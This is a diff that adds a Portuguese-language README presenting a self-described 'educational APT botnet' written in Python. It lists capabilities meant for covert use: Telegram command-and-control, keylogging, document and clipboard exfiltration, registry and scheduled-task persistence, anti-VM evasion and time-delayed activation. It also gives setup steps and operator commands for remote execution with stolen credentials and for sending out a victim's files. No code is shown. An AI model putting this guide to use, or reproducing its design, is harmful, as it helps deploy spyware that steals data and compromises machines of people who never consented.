@@ -1,0 +1,24 @@
+# GUIA DE ESTUDO – BOTNET APT EDUCACIONAL
+
+## FUNCIONALIDADES
+- Conexão via Telegram (C2)
+- Keylogger com envio periódico
+- Scanner de rede e execução remota
+- Exfiltração de documentos e clipboard
+- Persistência via Registro e Tarefa Agendada
+- Anti-VM (Sandbox, VirtualBox, VMware)
+- Ativação condicional (após hora X)
+
+## COMO TESTAR
+1. Crie um bot no Telegram com o @BotFather
+2. Substitua o BOT_TOKEN e CHAT_ID em botnet.py
+3. Instale dependências:
+   pip install -r requirements.txt
+4. Execute com:
+   python botnet.py
+
+## COMANDOS SUPORTADOS
+- /recon → mostra IPs ativos
+- /exec IP USUARIO SENHA → executa remotamente
+- /exfiltrar → envia documentos do usuário
+- comandos do sistema → 'whoami', 'dir', 'ipconfig'
